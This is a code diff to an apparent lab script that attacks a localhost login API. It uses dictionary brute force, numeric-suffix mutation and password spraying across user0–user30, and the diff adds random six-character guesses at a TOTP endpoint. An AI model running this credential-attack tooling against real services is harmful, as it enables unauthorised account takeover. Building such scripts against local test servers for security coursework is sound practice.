@@ -1,7 +1,8 @@
 import requests
 import json
 import time
-
+import secrets
+import string
 
 
 LOCAL_ADDRESS = 'http://localhost:8000'
@@ -13,13 +14,23 @@ def load_common_password():
     return dictionary_attack
 
 
-def post(username, password, session):
-    data = {
+def post(username, password, session,endpoint, code):
+    
+    if endpoint == "login":
+        # Post to the login endpoint
+        url = f"{LOCAL_ADDRESS}/api/login"
+        data = {
         'username': username,
         'password': password
     }
-    # Post to the login endpoint
-    url = f"{LOCAL_ADDRESS}/api/login"
+    elif endpoint == "totp":
+        url = f"{LOCAL_ADDRESS}/api/login_totp"
+        data = {
+        'username': username,
+        'password': password,
+        'code': code
+    }
+
     try:
         response = session.post(url, json=data)
     except requests.RequestException as e:
@@ -31,11 +42,11 @@ def post(username, password, session):
     content_type = response.headers.get('Content-Type', '')
     if 'application/json' in content_type:
         try:
-            print(response.json(), username, password)
+            print(response.json(), username, password, code)
         except ValueError:
             print("Response said JSON but could not parse it")
     else:
-        print(response.text, username, password)
+        print(response.text, username, password, code)
     return response.status_code
 
 
@@ -57,6 +68,8 @@ def brute_force(username):
     max_seconds = 2 * 3600   # 2 hours in secs
     attempt_count = 0
     session = requests.Session()
+    endpoint = "login"
+    code = None
 
     for password in common_passwords:
         
@@ -74,10 +87,14 @@ def brute_force(username):
         #check password without suffix
         password = password[:-1]
         print(password, username)
-        answer = post(username, password, session)
+        answer = post(username, password, session,endpoint, code)
         attempt_count += 1
         if answer == 200:
             return 1 
+        if answer == 403:
+            endpoint = "totp"
+            code = generate_code()
+
 
         if not password.isdigit():
             #check password with suffix
@@ -85,11 +102,14 @@ def brute_force(username):
                 for i in range(10**length):
                     suffix = f"{i:0{length}}"
                     current_password = password + suffix
-                    answer = post(username, current_password, session)
+                    answer = post(username, current_password, session,endpoint, code)
                     attempt_count += 1 
                     if answer == 200:
-                        print(current_password, username)
-                        return 1    
+                        print(current_password, username, code)
+                        return 1
+                    if answer == 403:
+                        endpoint = "totp"
+                        code = generate_code()   
     return 0
 
 
@@ -130,6 +150,8 @@ def start_password_spraying():
 def password_sparying(password, session, start_time,attempt_count):
     max_attempts = 1000000    
     max_seconds = 2 * 3600   # 2 hours in secs
+    endpoint = "login"
+    code = None
 
     for i in range(31):
         #check attempts limit
@@ -143,17 +165,25 @@ def password_sparying(password, session, start_time,attempt_count):
             print("Reached time limit (2 hours).")
             break
 
-        answer = post(f'user{i}', password, session)
+        answer = post(f'user{i}', password, session,endpoint,code)
 
         attempt_count += 1 
 
         if answer == 200:
             return (1, attempt_count)
+        elif answer == 403:
+            endpoint = "totp"
+            code = generate_code()
+
     return (0, attempt_count)
 
 
-def fool_captcha():
-    url = f"{LOCAL_ADDRESS}/api/login"
+def generate_code():
+    length = 6
+    allowed_characters = string.ascii_letters + string.digits
+    otp = ''.join(secrets.choice(allowed_characters) for _ in range(length))
+    return otp
+    
     
 
 
